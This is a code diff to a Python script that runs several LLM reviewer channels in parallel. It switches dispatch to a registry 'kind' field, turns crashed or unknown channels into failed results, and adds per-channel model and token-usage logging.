-        want = {want(c) or c for c in (a.only or ["http", "codex", "agy", "kimi"])}
+        # Degraded path: names only, no groups, no aliases beyond these. Anything not in
+        # _LEGACY_KINDS gets kind None and is reported as undispatchable rather than skipped.
+        alias = {"spark": "spark11", "http": "spark11", "gemini": "agy31pro",
+                 "kimi": "kimik3", "qwen": "qwen38max"}
+        want = {alias.get(c, c) for c in
+                (a.only or ["spark11", "spark12cont", "codex", "agy31pro", "agy36flash",
+                            "kimik3", "qwen38max"])}
     if not want:
         log("every channel is disabled - nothing to run")
         return 2
-    agy_cfg = (plan or {}).get("agy") or {}
-    codex_cfg = (plan or {}).get("codex") or {}
-    kimi_cfg = (plan or {}).get("kimi") or {}
+    kinds = {c: ((plan or {}).get(c) or _legacy_slot(c)).get("kind") for c in want}
 
     # Everything below is free and answers "will this round survive?" before it is launched.
     # It runs on --dry-run too: a preflight that skips the checks a real run needs is not a
     # preflight. Previously --dry-run verified the route, the brief path and the preset, then
     # said nothing about a missing key or a missing binary - so the first evidence that Codex
     # was not installed arrived after the other two channels had already been paid for.
-    preflight = list(channel_preflight(want, a.out))
+    preflight = list(channel_preflight(want, a.out, kinds, plan))
     for problem in preflight:
         log("  [preflight] " + problem)
 
@@ -1670,35 +2739,80 @@ def main():
 
     os.makedirs(a.out, exist_ok=True)
 
-    jobs = {}
+    jobs, unlaunched = {}, {}
     log("brief=%d chars  tier=%s  marker=%s" % (len(brief), a.tier, a.marker))
-    # Threads, not asyncio: two of the three channels are blocking subprocesses, and on Windows
+    # Threads, not asyncio: two of the channels are blocking subprocesses, and on Windows
     # asyncio subprocess support depends on the event loop policy. Threads just work.
-    with ThreadPoolExecutor(max_workers=4) as ex:
-        if "kimi" in want:
-            jobs["kimi"] = ex.submit(call_hermes, brief, a.marker,
-                                     os.path.join(a.out, "KIMI.md"),
-                                     model=kimi_cfg.get("model"),
-                                     toolsets=kimi_cfg.get("toolsets"),
-                                     system=system)
-        if "http" in want:
-            jobs["http"] = ex.submit(call_http_reviewer, brief, system, a.tier, a.marker)
-        if "codex" in want:
-            jobs["codex"] = ex.submit(call_codex, brief, a.marker,
-                                      os.path.join(a.out, "codex-ws"),
-                                      os.path.join(a.out, "CODEX.md"),
-                                      model=codex_cfg.get("model"),
-                                      effort=codex_cfg.get("effort"),
-                                      system=system)
-        if "agy" in want:
-            jobs["agy"] = ex.submit(call_agy, brief, a.marker,
-                                    os.path.join(a.out, "agy-ws"),
-                                    os.path.join(a.out, "AGY.md"),
-                                    model=agy_cfg.get("model"),
-                                    effort=agy_cfg.get("effort") or "high",
-                                    timeout=agy_cfg.get("timeout") or "25m",
-                                    system=system)
-        results = {k: f.result() for k, f in jobs.items()}
+    #
+    # 🔴 DISPATCH IS KEYED ON `kind`, NOT ON THE CHANNEL NAME. It used to be four literal
+    # `if "kimi" in want:` branches, which meant channels.json's own promise - "adding a channel
+    # is a change HERE, never in the code" - was false for any fifth channel: the registry entry
+    # loaded, resolved, printed in the plan as [RUN ], and then nothing launched it. A registry
+    # that is authoritative for four values and decorative for the fifth is the same defect as
+    # `channels.spark.model`, one level up, and it would have been discovered the same way:
+    # by a channel that silently never ran.
+    with ThreadPoolExecutor(max_workers=max(4, len(want))) as ex:
+        for cname in sorted(want):
+            p = (plan or {}).get(cname) or _legacy_slot(cname)
+            kind = p.get("kind")
+            outfile = os.path.join(a.out, cname.upper() + ".md")
+            workdir = os.path.join(a.out, cname + "-ws")
+            if kind == "http":
+                jobs[cname] = ex.submit(call_http_reviewer, brief, system, a.tier, a.marker,
+                                        model=p.get("model"), name=cname,
+                                        effort=p.get("effort"))
+            elif kind == "codex":
+                jobs[cname] = ex.submit(call_codex, brief, a.marker, workdir, outfile,
+                                        model=p.get("model"), effort=p.get("effort"),
+                                        timeout=p.get("timeout"), system=system)
+            elif kind == "agy":
+                jobs[cname] = ex.submit(call_agy, brief, a.marker, workdir, outfile,
+                                        model=p.get("model"),
+                                        effort=p.get("effort") or "high",
+                                        timeout=p.get("timeout") or "25m", system=system)
+            elif kind == "hermes":
+                jobs[cname] = ex.submit(call_hermes, brief, a.marker, outfile,
+                                        model=p.get("model"), toolsets=p.get("toolsets"),
+                                        system=system)
+            elif kind == "openrouter":
+                jobs[cname] = ex.submit(call_openrouter_reviewer, brief, a.marker, outfile,
+                                        model=p.get("model"), system=system,
+                                        web=p.get("web"), name=cname,
+                                        reasoning=p.get("reasoning"),
+                                        max_tokens=p.get("max_tokens"),
+                                        fetch_tool=p.get("fetch_tool"))
+            else:
+                # Named in the registry, unknown to the code. A log line is NOT enough: a log
+                # line scrolls, and every downstream consumer - the "N/M channels returned"
+                # count, the citation audit, diagnostics - reads `results`. A channel missing
+                # from that dict is indistinguishable from a channel that was never asked for,
+                # while the plan printed [RUN ] for it. So it gets a real, failed result.
+                log("  [%s] UNKNOWN kind %r - not launched. Known kinds: %s."
+                    % (cname, kind, ", ".join(KNOWN_KINDS)))
+                unlaunched[cname] = {
+                    "ok": False,
+                    "error": "channels.json gives this channel kind %r, which this version of "
+                             "orchestrate.py cannot dispatch. Known kinds: %s. Fix the `kind` "
+                             "field or disable the channel." % (kind, ", ".join(KNOWN_KINDS))}
+        # 🔴 NOT a dict comprehension over f.result(). Future.result() RE-RAISES whatever the
+        # worker raised, so one channel throwing would abort the comprehension and discard the
+        # results of every other channel - which have already run and already been paid for.
+        # Four good reviews lost to a fifth channel's crash, with an unhandled traceback in
+        # place of the output. Each failure is converted into the same shape every call function
+        # already returns for its own errors, so one channel dying costs exactly one channel.
+        results = {}
+        for cname, f in jobs.items():
+            try:
+                results[cname] = f.result()
+            except BaseException as exc:                    # noqa: BLE001 - deliberate catch-all
+                log("  [%s] RAISED: %r" % (cname, exc))
+                results[cname] = {"ok": False, "error": "channel raised: %r" % (exc,),
+                                  "traceback": traceback.format_exc()}
+    results.update(unlaunched)
+    # One authoritative assignment beats twenty literals scattered through the return statements
+    # of five functions, which is where the old per-channel `"channel": "http"` lived.
+    for cname, r in results.items():
+        r["channel"] = cname
 
     log("\n" + "=" * 78)
     ok_count = 0
@@ -1707,20 +2821,70 @@ def main():
             with open(os.path.join(a.out, name.upper() + ".md"), "w", encoding="utf-8") as f:
                 f.write(r["text"])
         status = "OK" if r.get("ok") else "PROBLEM"
-        log("[%s] %s  %ss" % (name, status, r.get("seconds", "?")))
+        slot = (plan or {}).get(name) or {}
+        kind = slot.get("kind") or _LEGACY_KINDS.get(name)
+        # 🔴 EVERY CHANNEL NAMES ITS MODEL, ON THE STATUS LINE, ALWAYS. Igor asked for this of
+        # codex ("пусть отображает модель ... если я попрошу аналитику по тому, как сработала
+        # оркестрация") and the request uncovered something worse: the per-channel telemetry
+        # below was gated on LITERAL CHANNEL NAMES - `name == "http"` - so the round-22 rename to
+        # `spark` silently switched it off. Measured in a real run log: [agy] and [kimi] printed
+        # their lines, [spark] printed none at all, and the numbers survived only in
+        # diagnostics.json where nobody looks. A reporting layer keyed on names is the same
+        # decorative-registry defect as the dispatcher had, one floor down, and it is worse
+        # there: dispatch fails loudly, reporting fails by going quiet.
+        shown = slot.get("model_label") or r.get("model") or slot.get("model")
+        if shown and slot.get("model") and shown != slot.get("model"):
+            shown = "%s [%s]" % (shown, slot["model"])
+        log("[%s] %s  %ss%s" % (name, status, r.get("seconds", "?"),
+                                ("  model=%s" % shown) if shown else ""))
+        if slot.get("model_overridden"):
+            log("    ⚠ MODEL OVERRIDDEN: this channel is named for %s" % slot.get("model_default"))
         if r.get("error"):
             log("    error: " + str(r["error"]))
-        if name == "http" and r.get("out_tokens") is not None:
-            log("    tokens in=%s out=%s | tool_calls=%s | stop=%s | blocks=%s"
+        if kind == "http" and r.get("out_tokens") is not None:
+            log("    tokens in=%s out=%s | tool_calls=%s | stop=%s | effort=%s | blocks=%s"
                 % (r.get("in_tokens"), r.get("out_tokens"), r.get("tool_calls"),
-                   r.get("stop_reason"), r.get("block_types")))
-        if name == "agy" and r.get("tool_calls") is not None:
+                   r.get("stop_reason"), r.get("effort"), r.get("block_types")))
+        if kind == "openrouter" and r.get("out_tokens") is not None:
+            # The direct channel finally has real usage numbers; Hermes reported none.
+            log("    tokens in=%s out=%s | reasoning_chars=%s | web=%s"
+                % (r.get("in_tokens"), r.get("out_tokens"),
+                   r.get("reasoning_chars"), (slot.get("web") or {}).get("enabled", False)))
+        if kind == "codex":
+            # 🔴 This block used to say "reports NO tool telemetry" full stop, which over-claimed
+            # in the direction that stops you looking. Corrected 2026-08-07: no TOOL telemetry
+            # (it never says which pages it opened, so the citation audit remains the only
+            # grounding instrument here) but full TOKEN usage via --json, and the weekly
+            # subscription state from its own rollout.
+            if r.get("out_tokens") is not None:
+                log("    tokens in=%s out=%s | reasoning=%s | cached_in=%s | effort=%s"
+                    % (r.get("in_tokens"), r.get("out_tokens"), r.get("reasoning_tokens"),
+                       r.get("cached_in_tokens"), slot.get("effort")))
+            else:
+                log("    effort=%s | no usage block in the event stream (older CLI, or --json "
+                    "output was not captured)" % slot.get("effort"))
+            rl = r.get("rate_limit") or {}
+            if rl.get("used_percent") is not None:
+                hrs = round((rl.get("window_minutes") or 0) / 60.0)
+                log("    subscription: %.1f%% of the %sh window used%s%s"
+                    % (rl["used_percent"], hrs,
+                       (", resets %s" % rl["resets_at"]) if rl.get("resets_at") else "",
+                       (" | plan=%s credits=%s" % (rl.get("plan_type"), rl.get("has_credits")))))
+                if rl["used_percent"] >= 95:
+                    log("    ⚠ WEEKLY LIMIT ESSENTIALLY EXHAUSTED - further runs draw on credits. "
+                        "Switch channel rather than opening a metered API path.")
+            log("    no TOOL telemetry on this channel: it never reports which pages it opened, "
+                "so the citation audit below is the only grounding instrument that works here")
+        if kind == "agy" and r.get("tool_calls") is not None:
             # This channel used to report nothing at all about its own work, so a fluent answer
             # written entirely from training data was indistinguishable from a researched one.
-            log("    thinking=%s out=%s | tools=%s (search/fetch=%s) denied=%s | "
+            # `errors=` is printed SEPARATELY from `denied=` since 2026-08-07: they had shared a
+            # counter under the name of the rarer and scarier one, so a failed fetch was reported
+            # as a permission denial and pointed the reader at the wrong fix.
+            log("    thinking=%s out=%s | tools=%s (search/fetch=%s) denied=%s errors=%s | "
                 "agy_status=%s perms=%s"
                 % (r.get("thinking"), r.get("out_tokens"), r.get("tool_calls"),
-                   r.get("searches"), r.get("denied"), r.get("agy_status"),
+                   r.get("searches"), r.get("denied"), r.get("tool_errors"), r.get("agy_status"),
                    r.get("perm_mode")))
             if r.get("events"):
                 log("    event log: %s" % r["events"])
